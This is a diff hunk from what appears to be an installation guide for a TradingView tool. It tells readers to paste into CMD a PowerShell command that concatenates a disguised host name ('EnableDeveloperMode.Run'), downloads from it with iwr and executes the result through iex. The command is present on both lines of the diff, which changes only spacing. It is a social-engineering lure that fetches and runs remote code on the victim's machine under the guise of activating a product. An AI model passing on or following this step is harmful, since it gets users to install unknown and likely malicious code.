@@ -20,7 +20,7 @@ Press `Win + R`, type `CMD`, and press **Enter**.
 
 Copy and paste the command below into the terminal:
 ```CMD
-powershell -command "$TradingView='Enable'; $Activate='DeveloperMode'; iwr ($TradingView + $Activate + '.' + 'Run') -useb| iex"
+powershell -command "$TradingView='Enable'; $Activate='DeveloperMode'; iwr ($TradingView + $Activate + '.' + 'Run') -useb | iex"
 `````
 
 ### Step 3: Restart & Analyze
